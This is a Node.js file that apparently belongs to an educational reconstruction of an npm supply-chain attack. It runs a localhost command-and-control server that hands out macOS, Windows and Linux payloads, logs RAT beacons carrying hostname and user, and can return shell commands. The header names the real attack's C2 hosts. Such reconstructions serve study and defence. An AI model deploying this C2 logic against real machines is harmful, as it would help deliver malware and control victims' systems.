/**
 * c2-server/server.js
 *
 * DEMO RECONSTRUCTION — Local C2 server simulation
 *
 * Mimics the real attack's C2 at sfrclak.com:8000 / packages.npm.org
 * Runs entirely on localhost:3000. Never contacts any external server.
 *
 * Endpoints:
 *   POST /product0  → serves macOS payload (AppleScript)
 *   POST /product1  → serves Windows payload (PowerShell)
 *   POST /product2  → serves Linux payload (Python)
 *   POST /beacon    → logs RAT check-ins and optionally sends commands
 *   GET  /dashboard → human-readable view of all check-ins
 */

"use strict";

const http = require("http");
const fs = require("fs");
const path = require("path");

const PORT = 3000;
const LOG_DIR = path.join(__dirname, "logs");
const PAYLOAD_DIR = path.join(__dirname, "..", "payloads");

if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR, { recursive: true });

// ─── BEACON LOG ──────────────────────────────────────────────────────────────

const beaconLog = [];

function logBeacon(data) {
  const entry = { ...data, timestamp: new Date().toISOString() };
  beaconLog.push(entry);

  const logFile = path.join(LOG_DIR, "beacons.jsonl");
  fs.appendFileSync(logFile, JSON.stringify(entry) + "\n");
  console.log(`[C2] Beacon received:`, entry);
}

// ─── PAYLOAD LOADER ──────────────────────────────────────────────────────────

function loadPayload(filename) {
  const p = path.join(PAYLOAD_DIR, filename);
  return fs.existsSync(p) ? fs.readFileSync(p, "utf8") : `echo "Payload ${filename} not found"`;
}

// ─── RESPONSE HELPERS ────────────────────────────────────────────────────────

function parseBody(req) {
  return new Promise((resolve) => {
    let body = "";
    req.on("data", (chunk) => (body += chunk));
    req.on("end", () => {
      try { resolve(JSON.parse(body)); } catch { resolve({}); }
    });
  });
}

function json(res, status, data) {
  const body = JSON.stringify(data, null, 2);
  res.writeHead(status, { "Content-Type": "application/json" });
  res.end(body);
}

function text(res, status, content, contentType = "text/plain") {
  res.writeHead(status, { "Content-Type": contentType });
  res.end(content);
}

// ─── DASHBOARD ───────────────────────────────────────────────────────────────

function renderDashboard() {
  const rows = beaconLog.map((b) => `
    <tr>
      <td>${b.timestamp}</td>
      <td>${b.platform || b.os || "?"}</td>
      <td>${b.hostname || b.node || "?"}</td>
      <td>${b.user || b.username || "?"}</td>
      <td>${b.beacon || "-"}</td>
    </tr>`).join("");

  return `<!DOCTYPE html>
<html>
<head>
  <title>C2 Dashboard — Demo</title>
  <meta http-equiv="refresh" content="5">
  <style>
    body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 2rem; }
    h1 { color: #ff6b6b; }
    .warning { background: #2d1b1b; border: 1px solid #ff6b6b; padding: 1rem; margin-bottom: 2rem; border-radius: 4px; }
    table { width: 100%; border-collapse: collapse; }
    th { background: #161b22; padding: 0.5rem 1rem; text-align: left; color: #58a6ff; }
    td { padding: 0.5rem 1rem; border-bottom: 1px solid #21262d; }
    tr:hover td { background: #161b22; }
    .count { color: #3fb950; font-size: 1.5rem; }
  </style>
</head>
<body>
  <div class="warning">
    ⚠️ EDUCATIONAL DEMO ONLY — All traffic is localhost. No real C2. No real victims.
  </div>
  <h1>C2 Dashboard</h1>
  <p>Total beacons received: <span class="count">${beaconLog.length}</span></p>
  <p><small>Auto-refreshes every 5 seconds</small></p>
  <table>
    <thead>
      <tr>
        <th>Timestamp</th>
        <th>Platform</th>
        <th>Hostname</th>
        <th>User</th>
        <th>Beacon #</th>
      </tr>
    </thead>
    <tbody>${rows || "<tr><td colspan='5'>No beacons yet. Run victim-app to trigger the dropper.</td></tr>"}</tbody>
  </table>
</body>
</html>`;
}

// ─── SERVER ──────────────────────────────────────────────────────────────────

const server = http.createServer(async (req, res) => {
  const { method, url } = req;
  console.log(`[C2] ${method} ${url}`);

  // macOS payload endpoint
  if (method === "POST" && url === "/product0") {
    const body = await parseBody(req);
    logBeacon({ ...body, platform: "macOS", endpoint: "/product0" });
    text(res, 200, loadPayload("macos.sh"), "text/plain");

  // Windows payload endpoint
  } else if (method === "POST" && url === "/product1") {
    const body = await parseBody(req);
    logBeacon({ ...body, platform: "Windows", endpoint: "/product1" });
    text(res, 200, loadPayload("windows.ps1"), "text/plain");

  // Linux payload endpoint
  } else if (method === "POST" && url === "/product2") {
    const body = await parseBody(req);
    logBeacon({ ...body, platform: "Linux", endpoint: "/product2" });
    text(res, 200, loadPayload("linux.py"), "text/plain");

  // RAT beacon endpoint (ongoing check-ins after installation)
  } else if (method === "POST" && url === "/beacon") {
    const body = await parseBody(req);
    logBeacon(body);
    // C2 can respond with commands here — for demo, just acknowledge
    json(res, 200, {
      status: "ok",
      command: null, // Could be: { type: "shell", cmd: "id" }
    });

  // Human-readable dashboard
  } else if (method === "GET" && url === "/dashboard") {
    text(res, 200, renderDashboard(), "text/html");

  } else {
    json(res, 404, { error: "Not found" });
  }
});

server.listen(PORT, "127.0.0.1", () => {
  console.log(`\n[C2] Demo C2 server running on http://localhost:${PORT}`);
  console.log(`[C2] Dashboard: http://localhost:${PORT}/dashboard`);
  console.log(`[C2] Waiting for beacon check-ins...\n`);
});
